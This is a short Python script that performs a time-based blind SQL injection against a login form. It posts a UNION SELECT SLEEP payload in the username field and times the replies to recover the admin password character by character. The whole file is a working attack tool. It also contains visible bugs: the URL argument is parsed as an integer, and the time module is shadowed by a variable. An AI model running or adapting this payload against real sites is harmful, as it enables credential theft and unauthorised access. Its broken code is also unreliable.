
import sys
import requests
import string
import time
from argparse import RawDescriptionHelpFormatter
import argparse


def bruteforcer(wait_time: int, url: str):

    # Get all printable chars whitout whitespace, you can add white space by removing the [:-6]
    chars = string.printable[:-6]

    base_url = url

    letter_found = True
    
    base_bruteforce = ""

    while True:

        # If it is true then keep going
        if letter_found == True:
            letter_found = False
        # If not, no letter was found on previous iteration so we can stop from here on
        else:
            break

        for char in chars:
            name = base_bruteforce + char

            # Create the payload
            payload = "admin' UNION SELECT SLEEP("+ str(wait_time) + "),1,2 from user where username like 'admin' and password like '"+ name+ "%'  #"
            
            data = {"username" : payload,
                    "password" : "password"}
            

            # If the payload needs to be added to the URL do it here
            # url = base_url + payload
            
            time_started = time.time()
            requests.post(url, data = data)
            time_finished = time.time()
            time_taken = time_finished - time_started

            if time_taken < wait_time:
                pass
            elif char == "%":
                pass
            else:
                base_bruteforce += char
                print(base_bruteforce)
                letter_found = True
                break

    print("\nResults:\nFound something with payload of "+ payload+"\n"+base_bruteforce)

    
if __name__ == ("__main__"):


    # Create an ArgumentParser object
    parser = argparse.ArgumentParser(description="A Python script to help with SQLi.\nThe payload needs to be changed manually as well as the post data or request type\nIf the payload needs to be inserted into the url then you must also make these changes to the script",formatter_class=RawDescriptionHelpFormatter)


    # Add command-line arguments
    parser.add_argument("-u", "--url", type=int, help="Specify the url to attack")
    parser.add_argument("-t", "--time", type=int, help="Specify the time to wait in seconds")

    # Parse the command-line arguments
    args = parser.parse_args()

    # Access the values of the parsed arguments
    url = args.url
    time = args.time
    wait_time = 0 


    # Check if the arguments were provided
    if url is None:
        print("Please provide a url using the -u or --url option.")
        sys.exit()

    if time is None:
        wait_time = 2
    else:
        try:
            wait_time = int(time)
        except:
            print("Using the -t or --time option an integer must be provided")
            sys.exit()





    bruteforcer(wait_time,url)
